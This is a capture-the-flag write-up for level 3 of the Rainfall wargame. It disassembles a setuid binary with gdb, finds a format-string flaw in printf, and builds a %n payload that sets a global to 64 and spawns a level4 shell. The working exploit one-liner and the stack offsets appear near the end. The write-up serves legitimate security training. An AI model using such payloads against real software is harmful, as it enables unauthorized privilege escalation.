LEVEL 3

When logging as level3 in Rainfall we have a home with an executable called
level3 :

-rwsr-s---+ 1 level4 users 5366 Mar  6  2016 level3

We can execute it :

level3@RainFall:~$ ./level3
hello there
hello there

It waits for an input from stdin and print it.

Let's try with more arguments :

level3@RainFall:~$ ./level3 "hi" "hello" "123456789"
boom
boom

Nothing is changing, level2 is still waiting for stdin
We can try to send a file as parameter :

level3@RainFall:~$ echo "hello world" > /tmp/hello
level3@RainFall:~$ ./level3 < /tmp/hello
hello world

Opening the executable with gdb :

(gdb) disas main
Dump of assembler code for function main:
   0x0804851a <+0>:	push   %ebp
   0x0804851b <+1>:	mov    %esp,%ebp
   0x0804851d <+3>:	and    $0xfffffff0,%esp
   0x08048520 <+6>:	call   0x80484a4 <v>
   0x08048525 <+11>:	leave
   0x08048526 <+12>:	ret
End of assembler dump.
(gdb) disas v
Dump of assembler code for function v:
   0x080484a4 <+0>:	push   %ebp
   0x080484a5 <+1>:	mov    %esp,%ebp
   0x080484a7 <+3>:	sub    $0x218,%esp
   0x080484ad <+9>:	mov    0x8049860,%eax
   0x080484b2 <+14>:	mov    %eax,0x8(%esp)
   0x080484b6 <+18>:	movl   $0x200,0x4(%esp)
   0x080484be <+26>:	lea    -0x208(%ebp),%eax
   0x080484c4 <+32>:	mov    %eax,(%esp)
   0x080484c7 <+35>:	call   0x80483a0 <fgets@plt>
   0x080484cc <+40>:	lea    -0x208(%ebp),%eax
   0x080484d2 <+46>:	mov    %eax,(%esp)
   0x080484d5 <+49>:	call   0x8048390 <printf@plt>
   0x080484da <+54>:	mov    0x804988c,%eax
   0x080484df <+59>:	cmp    $0x40,%eax
   0x080484e2 <+62>:	jne    0x8048518 <v+116>
   0x080484e4 <+64>:	mov    0x8049880,%eax
   0x080484e9 <+69>:	mov    %eax,%edx
   0x080484eb <+71>:	mov    $0x8048600,%eax
   0x080484f0 <+76>:	mov    %edx,0xc(%esp)
   0x080484f4 <+80>:	movl   $0xc,0x8(%esp)
   0x080484fc <+88>:	movl   $0x1,0x4(%esp)
   0x08048504 <+96>:	mov    %eax,(%esp)
   0x08048507 <+99>:	call   0x80483b0 <fwrite@plt>
   0x0804850c <+104>:	movl   $0x804860d,(%esp)
   0x08048513 <+111>:	call   0x80483c0 <system@plt>
   0x08048518 <+116>:	leave
   0x08048519 <+117>:	ret
End of assembler dump.

In v function we have one call to system function, and in argument we can see "/bin/sh".
for execute this, we have to pass the comparison: 
	   0x080484df <+59>:	cmp    $0x40,%eax

We deduce and read online about print exploit.
It's called a format string exploit.

Basically it uses the format style of printf to print stack variable.

Giving as an argument %x, which prints in hexa with printf we can see stack 
variable next to printf :

level3@RainFall:~$ python -c 'print "%x " * 9' | ./level3
200 b7fd1ac0 b7ff37d0 25207825 78252078 20782520 25207825 78252078 20782520 

We need to know what value printf will display to calculate the difference between
the values of the stack and ours.

If we have 41414141 at the end, it is because we write just after the first 3 sections.
We check in the stack:

Breakpoint 1, 0x080484df in v ()
(gdb) x/32x $esp
0xbffff4e0:	0xbffff4f0	0x00000200	0xb7fd1ac0	0xb7ff37d0
0xbffff4f0:	0x41414141	0x2e78252e	0x252e7825	0x78252e78
0xbffff500:	0xbfff000a	0xb7fde2d4	0xb7fde334	0x00000007
0xbffff510:	0x00000000	0xb7fde000	0xb7fff53c	0xbffff558
0xbffff520:	0x00000040	0x00000b80	0x00000000	0xb7fde714
0xbffff530:	0x00000098	0x0000000b	0x00000000	0x00000000
0xbffff540:	0x00000000	0x00000000	0x00000000	0x00000000
0xbffff550:	0x00000000	0xb7fe765d	0xb7e3ebaf	0x080482bb

Yes indeed everything follows, between our AAAA and the beginning we have 4 sections,
so to exploit the vulnerability of printf we will have to skip the first 3
section.

The vulnerability in question is the %n, it allows to store at the given address the
number of characters written by printf. And to modify the comparison.

So we need the address of 'm' the comparison variable.

(gdb) p &m
$1 = (<data variable, no debug info> *) 0x804988c

And the value of the comparison which is 0x40 so 64.

We do a first test with: 
python -c 'print "\x8c\x98\x04\x08" + "%x" * 3 + "%n"'

(gdb) i r
eax            0x17	23

Yes eax (m) has been modified.
We need 64, 64 - 23 = 41.
We will add a padding of 41 for the size.

python -c 'print "\x8c\x98\x04\x08" + "%x" * 2 + "%41x" + "%n"'
(gdb) i r
eax            0x38	56

We are still missing 8 bytes:
level3@RainFall:~$ (python -c 'print "\x8c\x98\x04\x08" + "%x" * 2 + "%49x" + "%n"' ; cat) | ./level3
ï¿½200b7fd1ac0                                         b7ff37d0
Wait what?!
whoami
level4


